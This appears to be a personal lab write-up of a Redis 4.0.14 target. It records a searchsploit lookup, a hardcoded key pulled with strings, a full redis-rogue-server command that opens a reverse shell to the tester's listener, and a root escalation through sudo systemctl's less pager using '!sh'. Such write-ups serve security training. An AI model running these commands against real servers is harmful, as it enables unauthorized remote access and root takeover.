## Takeaway
## Metadata
- Port `6379` is running `redis` of version 4.0.14.
	- Upon using `searchsploit`, one can immediately identify a` unauthenticated RCE`  in `redis` version 4.x/5.x.![[Pasted image 20240326190552.png]
	- https://github.com/n0b0dyCN/redis-rogue-server
- Enumerate as `prudence`, running `sudo -l`, one can identify that it can run `/usr/local/bin/redis-status` as `root` without password.![[Pasted image 20240326194307.png]]
	- we will be asked an `Authorization Key` after running the executable.![[Pasted image 20240326194442.png]]
	- However, if one run `strings /usr/local/bin/redis-status`, an hardcoded key can be identified as `ClimbingParrotKickingDonkey321`. Moreover, it appears that the executable is running `/usr/bin/systemctl status redis` after receiving the correct `Authorization Key`![[Pasted image 20240326194552.png]]
		- Looking into `GTFO` bin, one can notice that we can actually spawn a shell within the default pager which is likely `less` used by `systemctl`.![[Pasted image 20240326194841.png]]
# Exploitation
## Shell as prudence
- Run git clone `https://github.com/n0b0dyCN/redis-rogue-server` to retrieve exploit and run `python3 redis-rogue-server.py --rhost=192.168.193.176 --lhost=192.168.45.189 --lport=443` and choose reverse shell to get a shell as `prudence`.![[Pasted image 20240326192812.png]]
# PrivEsc
- Run `sudo /usr/local/bin/redis-status` and input password to get `systemctl` command to run and show data using default pager `less`.
- Within the default pager `less`, run `!sh` to get a root shell.![[Pasted image 20240326195112.png]]